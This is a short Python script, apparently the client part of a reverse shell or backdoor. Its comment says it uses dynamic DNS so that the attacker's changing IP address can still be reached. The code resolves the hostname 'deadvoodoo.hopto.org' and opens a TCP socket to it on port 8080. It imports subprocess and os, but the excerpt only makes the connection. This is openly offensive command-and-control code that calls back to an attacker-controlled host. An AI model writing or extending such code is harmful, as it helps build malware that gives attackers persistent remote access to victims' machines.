## when Attacker IP address was changed, use ddns to connect changable ip address

import socket
import subprocess
import os

def connect(ip):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,8080))

def main():
    ip = socket.gethostbyname("deadvoodoo.hopto.org")
    print("Resolved IP was : "+ip)
    connect(ip)

main()
